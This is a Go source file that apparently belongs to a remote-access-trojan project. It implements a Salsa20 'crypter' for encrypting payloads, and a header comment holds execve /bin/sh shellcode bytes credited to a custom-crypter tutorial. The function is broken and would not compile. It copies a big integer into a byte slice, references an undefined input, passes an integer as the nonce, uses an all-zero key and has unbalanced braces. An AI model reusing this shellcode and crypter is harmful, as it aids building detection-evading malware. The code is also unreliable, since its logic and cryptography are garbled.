/*/
Uses code from:
https://snowscan.io/custom-crypter/

	// execve shellcode /bin/sh
	in := []byte{
		0xeb, 0x1a, 0x5e, 0x31, 0xdb, 0x88, 0x5e, 0x07,
		0x89, 0x76, 0x08, 0x89, 0x5e, 0x0c, 0x8d, 0x1e,
		0x8d, 0x4e, 0x08, 0x8d, 0x56, 0x0c, 0x31, 0xc0,
		0xb0, 0x0b, 0xcd, 0x80, 0xe8, 0xe1, 0xff, 0xff,
		0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,
		0x41, 0x42, 0x42, 0x42, 0x42, 0x43, 0x43, 0x43,
		0x43}

	out := make([]byte, len(in))

	// Generate a random 24 bytes nonce
	nonce := make([]byte, 24)
	if _, err := rand.Read(nonce); err != nil {
		panic(err)
	}


/*/

package CryptographicFunctions

import (
	"crypto/rand"
	"fmt"
	"go_rat/pkg/shared_code/ErrorHandling"
	"math/big"
	"os"

	"golang.org/x/crypto/salsa20"
)

// This function uses the Salsa20 to encrypt a byte field
// with a variable sized nonce
func ByteSizedSalsa(bytes_in []byte, EncryptionKey []byte) (Salsa []byte, derp error) {
	var p *big.Int
	var key [32]byte
	out := make([]byte, len(bytes_in))
	// Generate a random 32 bytes nonce
	// make buffer
	herp := make([]byte, 32)
	// make random 32 bit prime number
	p, derp = rand.Prime(rand.Reader, 32)
	//copy number into buffer
	nonce, derp := copy(herp, p)
	if derp != nil {
		ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
	}


	if derp != nil {
		ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
	}
	// I was advised not to make my own unless I was a professional mathermind
	// this is the easy cheater way, use someone elses work
	salsa20.XORKeyStream(out, in, nonce, &key)

	for _, element := range out {
		if element == 0 {
			ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
			//return
			}
		}
	}
}
